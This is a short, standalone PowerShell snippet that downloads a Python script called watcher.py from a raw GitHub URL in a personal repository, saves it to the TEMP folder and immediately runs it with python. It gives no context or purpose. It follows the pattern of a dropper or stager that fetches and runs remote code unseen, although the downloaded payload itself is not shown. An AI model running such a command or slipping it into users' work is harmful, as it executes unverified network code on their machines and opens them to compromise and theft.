$path = "$env:TEMP\watcher.py"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/LEv421/rbduk/main/watcher.py" -OutFile $path
Start-Process "python" -ArgumentList $path
